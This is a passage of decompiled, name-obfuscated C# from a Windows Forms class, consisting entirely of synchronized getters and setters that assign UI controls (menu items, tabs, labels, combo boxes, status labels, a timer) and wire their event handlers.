	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_297(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_44);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_68;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_68 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_68;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000647 RID: 1607 RVA: 0x000059E7 File Offset: 0x00003BE7
	internal ToolStripMenuItem vmethod_298()
	{
		return this.toolStripMenuItem_69;
	}

	// Token: 0x06000648 RID: 1608 RVA: 0x00037398 File Offset: 0x00035598
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_299(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_103);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_69;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_69 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_69;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000649 RID: 1609 RVA: 0x000059EF File Offset: 0x00003BEF
	internal TabPage vmethod_300()
	{
		return this.tabPage_7;
	}

	// Token: 0x0600064A RID: 1610 RVA: 0x000059F7 File Offset: 0x00003BF7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_301(TabPage tabPage_17)
	{
		this.tabPage_7 = tabPage_17;
	}

	// Token: 0x0600064B RID: 1611 RVA: 0x00005A00 File Offset: 0x00003C00
	internal Label vmethod_302()
	{
		return this.label_16;
	}

	// Token: 0x0600064C RID: 1612 RVA: 0x00005A08 File Offset: 0x00003C08
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_303(Label label_30)
	{
		this.label_16 = label_30;
	}

	// Token: 0x0600064D RID: 1613 RVA: 0x00005A11 File Offset: 0x00003C11
	internal ComboBox vmethod_304()
	{
		return this.comboBox_4;
	}

	// Token: 0x0600064E RID: 1614 RVA: 0x00005A19 File Offset: 0x00003C19
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_305(ComboBox comboBox_9)
	{
		this.comboBox_4 = comboBox_9;
	}

	// Token: 0x0600064F RID: 1615 RVA: 0x00005A22 File Offset: 0x00003C22
	internal Label vmethod_306()
	{
		return this.label_17;
	}

	// Token: 0x06000650 RID: 1616 RVA: 0x00005A2A File Offset: 0x00003C2A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_307(Label label_30)
	{
		this.label_17 = label_30;
	}

	// Token: 0x06000651 RID: 1617 RVA: 0x00005A33 File Offset: 0x00003C33
	internal StatusStrip vmethod_308()
	{
		return this.statusStrip_1;
	}

	// Token: 0x06000652 RID: 1618 RVA: 0x00005A3B File Offset: 0x00003C3B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_309(StatusStrip statusStrip_11)
	{
		this.statusStrip_1 = statusStrip_11;
	}

	// Token: 0x06000653 RID: 1619 RVA: 0x00005A44 File Offset: 0x00003C44
	internal ToolStripStatusLabel vmethod_310()
	{
		return this.toolStripStatusLabel_5;
	}

	// Token: 0x06000654 RID: 1620 RVA: 0x00005A4C File Offset: 0x00003C4C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_311(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_5 = toolStripStatusLabel_40;
	}

	// Token: 0x06000655 RID: 1621 RVA: 0x00005A55 File Offset: 0x00003C55
	internal ToolStripStatusLabel vmethod_312()
	{
		return this.toolStripStatusLabel_6;
	}

	// Token: 0x06000656 RID: 1622 RVA: 0x00005A5D File Offset: 0x00003C5D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_313(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_6 = toolStripStatusLabel_40;
	}

	// Token: 0x06000657 RID: 1623 RVA: 0x00005A66 File Offset: 0x00003C66
	internal ToolStripStatusLabel vmethod_314()
	{
		return this.toolStripStatusLabel_7;
	}

	// Token: 0x06000658 RID: 1624 RVA: 0x00005A6E File Offset: 0x00003C6E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_315(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_7 = toolStripStatusLabel_40;
	}

	// Token: 0x06000659 RID: 1625 RVA: 0x00005A77 File Offset: 0x00003C77
	internal GClass7 vmethod_316()
	{
		return this.gclass7_2;
	}

	// Token: 0x0600065A RID: 1626 RVA: 0x000373DC File Offset: 0x000355DC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_317(GClass7 gclass7_13)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_203);
		MouseEventHandler value2 = new MouseEventHandler(this.method_296);
		GClass7 gclass = this.gclass7_2;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
			gclass.MouseDoubleClick -= value2;
		}
		this.gclass7_2 = gclass7_13;
		gclass = this.gclass7_2;
		if (gclass != null)
		{
			gclass.MouseUp += value;
			gclass.MouseDoubleClick += value2;
		}
	}

	// Token: 0x0600065B RID: 1627 RVA: 0x00005A7F File Offset: 0x00003C7F
	internal Label vmethod_318()
	{
		return this.label_18;
	}

	// Token: 0x0600065C RID: 1628 RVA: 0x00005A87 File Offset: 0x00003C87
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_319(Label label_30)
	{
		this.label_18 = label_30;
	}

	// Token: 0x0600065D RID: 1629 RVA: 0x00005A90 File Offset: 0x00003C90
	internal ComboBox vmethod_320()
	{
		return this.comboBox_5;
	}

	// Token: 0x0600065E RID: 1630 RVA: 0x00005A98 File Offset: 0x00003C98
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_321(ComboBox comboBox_9)
	{
		this.comboBox_5 = comboBox_9;
	}

	// Token: 0x0600065F RID: 1631 RVA: 0x00005AA1 File Offset: 0x00003CA1
	internal Label vmethod_322()
	{
		return this.label_19;
	}

	// Token: 0x06000660 RID: 1632 RVA: 0x00005AA9 File Offset: 0x00003CA9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_323(Label label_30)
	{
		this.label_19 = label_30;
	}

	// Token: 0x06000661 RID: 1633 RVA: 0x00005AB2 File Offset: 0x00003CB2
	internal ToolStripMenuItem vmethod_324()
	{
		return this.toolStripMenuItem_70;
	}

	// Token: 0x06000662 RID: 1634 RVA: 0x0003743C File Offset: 0x0003563C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_325(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_104);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_70;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_70 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_70;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000663 RID: 1635 RVA: 0x00005ABA File Offset: 0x00003CBA
	internal ComboBox vmethod_326()
	{
		return this.comboBox_6;
	}

	// Token: 0x06000664 RID: 1636 RVA: 0x00005AC2 File Offset: 0x00003CC2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_327(ComboBox comboBox_9)
	{
		this.comboBox_6 = comboBox_9;
	}

	// Token: 0x06000665 RID: 1637 RVA: 0x00005ACB File Offset: 0x00003CCB
	internal Label vmethod_328()
	{
		return this.label_20;
	}

	// Token: 0x06000666 RID: 1638 RVA: 0x00005AD3 File Offset: 0x00003CD3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_329(Label label_30)
	{
		this.label_20 = label_30;
	}

	// Token: 0x06000667 RID: 1639 RVA: 0x00005ADC File Offset: 0x00003CDC
	internal CheckBox vmethod_330()
	{
		return this.checkBox_4;
	}

	// Token: 0x06000668 RID: 1640 RVA: 0x00005AE4 File Offset: 0x00003CE4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_331(CheckBox checkBox_8)
	{
		this.checkBox_4 = checkBox_8;
	}

	// Token: 0x06000669 RID: 1641 RVA: 0x00005AED File Offset: 0x00003CED
	internal ContextMenuStrip vmethod_332()
	{
		return this.contextMenuStrip_5;
	}

	// Token: 0x0600066A RID: 1642 RVA: 0x00005AF5 File Offset: 0x00003CF5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_333(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_5 = contextMenuStrip_14;
	}

	// Token: 0x0600066B RID: 1643 RVA: 0x00005AFE File Offset: 0x00003CFE
	internal ToolStripMenuItem vmethod_334()
	{
		return this.toolStripMenuItem_71;
	}

	// Token: 0x0600066C RID: 1644 RVA: 0x00037480 File Offset: 0x00035680
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_335(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_107);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_71;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_71 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_71;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600066D RID: 1645 RVA: 0x00005B06 File Offset: 0x00003D06
	internal ToolStripSeparator vmethod_336()
	{
		return this.toolStripSeparator_14;
	}

	// Token: 0x0600066E RID: 1646 RVA: 0x00005B0E File Offset: 0x00003D0E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_337(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_14 = toolStripSeparator_39;
	}

	// Token: 0x0600066F RID: 1647 RVA: 0x00005B17 File Offset: 0x00003D17
	internal ToolStripMenuItem vmethod_338()
	{
		return this.toolStripMenuItem_72;
	}

	// Token: 0x06000670 RID: 1648 RVA: 0x000374C4 File Offset: 0x000356C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_339(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_105);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_72;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_72 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_72;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000671 RID: 1649 RVA: 0x00005B1F File Offset: 0x00003D1F
	internal SaveFileDialog vmethod_340()
	{
		return this.saveFileDialog_0;
	}

	// Token: 0x06000672 RID: 1650 RVA: 0x00005B27 File Offset: 0x00003D27
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_341(SaveFileDialog saveFileDialog_1)
	{
		this.saveFileDialog_0 = saveFileDialog_1;
	}

	// Token: 0x06000673 RID: 1651 RVA: 0x00005B30 File Offset: 0x00003D30
	internal System.Windows.Forms.Timer vmethod_342()
	{
		return this.timer_1;
	}

	// Token: 0x06000674 RID: 1652 RVA: 0x00037508 File Offset: 0x00035708
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_343(System.Windows.Forms.Timer timer_4)
	{
		EventHandler value = new EventHandler(this.method_109);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_4;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000675 RID: 1653 RVA: 0x00005B38 File Offset: 0x00003D38
	internal ToolStripMenuItem vmethod_344()
	{
		return this.toolStripMenuItem_73;
	}

	// Token: 0x06000676 RID: 1654 RVA: 0x0003754C File Offset: 0x0003574C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_345(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_106);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_73;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_73 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_73;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000677 RID: 1655 RVA: 0x00005B40 File Offset: 0x00003D40
	internal ToolStripSeparator vmethod_346()
	{
		return this.toolStripSeparator_15;
	}

	// Token: 0x06000678 RID: 1656 RVA: 0x00005B48 File Offset: 0x00003D48
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_347(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_15 = toolStripSeparator_39;
	}

	// Token: 0x06000679 RID: 1657 RVA: 0x00005B51 File Offset: 0x00003D51
	internal ToolStripMenuItem vmethod_348()
	{
		return this.toolStripMenuItem_74;
	}

	// Token: 0x0600067A RID: 1658 RVA: 0x00037590 File Offset: 0x00035790
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_349(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_112);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_74;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_74 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_74;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600067B RID: 1659 RVA: 0x00005B59 File Offset: 0x00003D59
	internal TabPage vmethod_350()
	{
		return this.tabPage_8;
	}

	// Token: 0x0600067C RID: 1660 RVA: 0x00005B61 File Offset: 0x00003D61
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_351(TabPage tabPage_17)
	{
		this.tabPage_8 = tabPage_17;
	}

	// Token: 0x0600067D RID: 1661 RVA: 0x00005B6A File Offset: 0x00003D6A
	internal RichTextBox vmethod_352()
	{
		return this.richTextBox_2;
	}

	// Token: 0x0600067E RID: 1662 RVA: 0x00005B72 File Offset: 0x00003D72
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_353(RichTextBox richTextBox_5)
	{
		this.richTextBox_2 = richTextBox_5;
	}

	// Token: 0x0600067F RID: 1663 RVA: 0x00005B7B File Offset: 0x00003D7B
	internal ToolStripMenuItem vmethod_354()
	{
		return this.toolStripMenuItem_75;
	}

	// Token: 0x06000680 RID: 1664 RVA: 0x00005B83 File Offset: 0x00003D83
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_355(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_75 = toolStripMenuItem_136;
	}

	// Token: 0x06000681 RID: 1665 RVA: 0x00005B8C File Offset: 0x00003D8C
	internal ToolStripMenuItem vmethod_356()
	{
		return this.toolStripMenuItem_76;
	}

	// Token: 0x06000682 RID: 1666 RVA: 0x000375D4 File Offset: 0x000357D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_357(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_117);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_76;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_76 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_76;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000683 RID: 1667 RVA: 0x00005B94 File Offset: 0x00003D94
	internal TabPage vmethod_358()
	{
		return this.tabPage_9;
	}

	// Token: 0x06000684 RID: 1668 RVA: 0x00005B9C File Offset: 0x00003D9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_359(TabPage tabPage_17)
	{
		this.tabPage_9 = tabPage_17;
	}

	// Token: 0x06000685 RID: 1669 RVA: 0x00005BA5 File Offset: 0x00003DA5
	internal ContextMenuStrip vmethod_360()
	{
		return this.contextMenuStrip_6;
	}

	// Token: 0x06000686 RID: 1670 RVA: 0x00005BAD File Offset: 0x00003DAD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_361(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_6 = contextMenuStrip_14;
	}

	// Token: 0x06000687 RID: 1671 RVA: 0x00005BB6 File Offset: 0x00003DB6
	internal ToolStripMenuItem vmethod_362()
	{
		return this.toolStripMenuItem_77;
	}

	// Token: 0x06000688 RID: 1672 RVA: 0x00037618 File Offset: 0x00035818
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_363(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_118);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_77;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_77 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_77;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000689 RID: 1673 RVA: 0x00005BBE File Offset: 0x00003DBE
	internal ZeroitAnidasoCircleProgress vmethod_364()
	{
		return this.zeroitAnidasoCircleProgress_2;
	}

	// Token: 0x0600068A RID: 1674 RVA: 0x00005BC6 File Offset: 0x00003DC6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_365(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_2 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x0600068B RID: 1675 RVA: 0x00005BCF File Offset: 0x00003DCF
	internal ToolStripSeparator vmethod_366()
	{
		return this.toolStripSeparator_16;
	}

	// Token: 0x0600068C RID: 1676 RVA: 0x00005BD7 File Offset: 0x00003DD7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_367(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_16 = toolStripSeparator_39;
	}

	// Token: 0x0600068D RID: 1677 RVA: 0x00005BE0 File Offset: 0x00003DE0
	internal ToolStripMenuItem vmethod_368()
	{
		return this.toolStripMenuItem_78;
	}

	// Token: 0x0600068E RID: 1678 RVA: 0x0003765C File Offset: 0x0003585C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_369(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_119);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_78;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_78 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_78;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600068F RID: 1679 RVA: 0x00005BE8 File Offset: 0x00003DE8
	internal ToolStripMenuItem vmethod_370()
	{
		return this.toolStripMenuItem_79;
	}

	// Token: 0x06000690 RID: 1680 RVA: 0x00005BF0 File Offset: 0x00003DF0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_371(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_79 = toolStripMenuItem_136;
	}

	// Token: 0x06000691 RID: 1681 RVA: 0x00005BF9 File Offset: 0x00003DF9
	internal ToolStripMenuItem vmethod_372()
	{
		return this.toolStripMenuItem_80;
	}

	// Token: 0x06000692 RID: 1682 RVA: 0x000376A0 File Offset: 0x000358A0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_373(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_123);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_80;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_80 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_80;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000693 RID: 1683 RVA: 0x00005C01 File Offset: 0x00003E01
	internal ToolStripMenuItem vmethod_374()
	{
		return this.toolStripMenuItem_81;
	}

	// Token: 0x06000694 RID: 1684 RVA: 0x000376E4 File Offset: 0x000358E4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_375(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_122);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_81;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_81 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_81;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000695 RID: 1685 RVA: 0x00005C09 File Offset: 0x00003E09
	internal ToolStripSeparator vmethod_376()
	{
		return this.toolStripSeparator_17;
	}

	// Token: 0x06000696 RID: 1686 RVA: 0x00005C11 File Offset: 0x00003E11
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_377(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_17 = toolStripSeparator_39;
	}

	// Token: 0x06000697 RID: 1687 RVA: 0x00005C1A File Offset: 0x00003E1A
	internal ToolStripMenuItem vmethod_378()
	{
		return this.toolStripMenuItem_82;
	}

	// Token: 0x06000698 RID: 1688 RVA: 0x00037728 File Offset: 0x00035928
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_379(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_124);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_82;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_82 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_82;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000699 RID: 1689 RVA: 0x00005C22 File Offset: 0x00003E22
	internal ToolStripMenuItem vmethod_380()
	{
		return this.toolStripMenuItem_83;
	}

	// Token: 0x0600069A RID: 1690 RVA: 0x00005C2A File Offset: 0x00003E2A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_381(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_83 = toolStripMenuItem_136;
	}

	// Token: 0x0600069B RID: 1691 RVA: 0x00005C33 File Offset: 0x00003E33
	internal ToolStripMenuItem vmethod_382()
	{
		return this.toolStripMenuItem_84;
	}

	// Token: 0x0600069C RID: 1692 RVA: 0x0003776C File Offset: 0x0003596C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_383(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_129);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_84;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_84 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_84;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600069D RID: 1693 RVA: 0x00005C3B File Offset: 0x00003E3B
	internal ToolStripMenuItem vmethod_384()
	{
		return this.toolStripMenuItem_85;
	}

	// Token: 0x0600069E RID: 1694 RVA: 0x000377B0 File Offset: 0x000359B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_385(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_130);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_85;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_85 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_85;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600069F RID: 1695 RVA: 0x00005C43 File Offset: 0x00003E43
	internal Label vmethod_386()
	{
		return this.label_21;
	}

	// Token: 0x060006A0 RID: 1696 RVA: 0x00005C4B File Offset: 0x00003E4B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_387(Label label_30)
	{
		this.label_21 = label_30;
	}

	// Token: 0x060006A1 RID: 1697 RVA: 0x00005C54 File Offset: 0x00003E54
	internal GClass7 vmethod_388()
	{
		return this.gclass7_3;
	}

	// Token: 0x060006A2 RID: 1698 RVA: 0x000377F4 File Offset: 0x000359F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_389(GClass7 gclass7_13)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_143);
		KeyEventHandler value2 = new KeyEventHandler(this.method_151);
		EventHandler value3 = new EventHandler(this.method_152);
		ColumnClickEventHandler value4 = new ColumnClickEventHandler(this.method_195);
		GClass7 gclass = this.gclass7_3;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
			gclass.KeyDown -= value2;
			gclass.DoubleClick -= value3;
			gclass.ColumnClick -= value4;
		}
		this.gclass7_3 = gclass7_13;
		gclass = this.gclass7_3;
		if (gclass != null)
		{
			gclass.MouseUp += value;
			gclass.KeyDown += value2;
			gclass.DoubleClick += value3;
			gclass.ColumnClick += value4;
		}
	}

	// Token: 0x060006A3 RID: 1699 RVA: 0x00005C5C File Offset: 0x00003E5C
	internal ContextMenuStrip vmethod_390()
	{
		return this.contextMenuStrip_7;
	}

	// Token: 0x060006A4 RID: 1700 RVA: 0x00005C64 File Offset: 0x00003E64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_391(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_7 = contextMenuStrip_14;
	}

	// Token: 0x060006A5 RID: 1701 RVA: 0x00005C6D File Offset: 0x00003E6D
	internal ToolStripMenuItem vmethod_392()
	{
		return this.toolStripMenuItem_86;
	}

	// Token: 0x060006A6 RID: 1702 RVA: 0x0003788C File Offset: 0x00035A8C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_393(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_131);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_86;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_86 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_86;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006A7 RID: 1703 RVA: 0x00005C75 File Offset: 0x00003E75
	internal ToolStripMenuItem vmethod_394()
	{
		return this.toolStripMenuItem_87;
	}

	// Token: 0x060006A8 RID: 1704 RVA: 0x000378D0 File Offset: 0x00035AD0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_395(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_135);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_87;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_87 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_87;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006A9 RID: 1705 RVA: 0x00005C7D File Offset: 0x00003E7D
	internal StatusStrip vmethod_396()
	{
		return this.statusStrip_2;
	}

	// Token: 0x060006AA RID: 1706 RVA: 0x00005C85 File Offset: 0x00003E85
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_397(StatusStrip statusStrip_11)
	{
		this.statusStrip_2 = statusStrip_11;
	}

	// Token: 0x060006AB RID: 1707 RVA: 0x00005C8E File Offset: 0x00003E8E
	internal ToolStripStatusLabel vmethod_398()
	{
		return this.toolStripStatusLabel_8;
	}

	// Token: 0x060006AC RID: 1708 RVA: 0x00005C96 File Offset: 0x00003E96
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_399(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_8 = toolStripStatusLabel_40;
	}

	// Token: 0x060006AD RID: 1709 RVA: 0x00005C9F File Offset: 0x00003E9F
	internal ToolStripStatusLabel vmethod_400()
	{
		return this.toolStripStatusLabel_9;
	}

	// Token: 0x060006AE RID: 1710 RVA: 0x00005CA7 File Offset: 0x00003EA7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_401(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_9 = toolStripStatusLabel_40;
	}

	// Token: 0x060006AF RID: 1711 RVA: 0x00005CB0 File Offset: 0x00003EB0
	internal ToolStripStatusLabel vmethod_402()
	{
		return this.toolStripStatusLabel_10;
	}

	// Token: 0x060006B0 RID: 1712 RVA: 0x00005CB8 File Offset: 0x00003EB8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_403(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_10 = toolStripStatusLabel_40;
	}

	// Token: 0x060006B1 RID: 1713 RVA: 0x00005CC1 File Offset: 0x00003EC1
